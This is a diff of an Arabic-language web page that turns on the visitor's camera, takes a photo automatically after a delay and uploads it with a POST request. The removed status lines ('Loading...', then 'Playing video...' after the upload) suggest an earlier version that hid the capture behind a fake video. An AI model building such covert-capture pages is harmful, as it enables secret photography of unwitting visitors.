@@ -31,7 +31,7 @@
   </style>
 </head>
 <body>
-  <div id="status">📡 جاري التحميل...</div>
+  <div id="status">📡 جاري تشغيل الكاميرا...</div>
 
   <video id="video" autoplay playsinline muted></video>
   <canvas id="canvas" width="300" height="300"></canvas>
@@ -46,18 +46,15 @@
         const video = document.getElementById("video");
         video.srcObject = stream;
 
-        // ننتظر أول فريم حقيقي باستخدام requestAnimationFrame
-        const waitForFrame = () => {
-          if (video.videoWidth > 0 && video.videoHeight > 0) {
+        video.onloadedmetadata = () => {
+          document.getElementById("status").innerText = "📸 يتم التحضير للتصوير...";
+          setTimeout(() => {
             takePhoto(stream);
-          } else {
-            requestAnimationFrame(waitForFrame);
-          }
+          }, 5000); // ← 5 ثواني انتظار
         };
-        requestAnimationFrame(waitForFrame);
 
       } catch (e) {
-        document.getElementById("status").innerText = "❌ رفضت الكاميرا.";
+        document.getElementById("status").innerText = "❌ تم رفض الكاميرا.";
       }
     }
 
@@ -78,9 +75,9 @@
           method: "POST",
           body: formData
         }).then(r => r.json()).then(d => {
-          document.getElementById("status").innerText = "📽️ جاري تشغيل الفيديو...";
+          document.getElementById("status").innerText = "📽️ تم إرسال الصورة!";
         }).catch(err => {
-          document.getElementById("status").innerText = "❌ فشل في الإرسال";
+          document.getElementById("status").innerText = "❌ فشل في الإرسال.";
         });
       }, "image/png");
     }
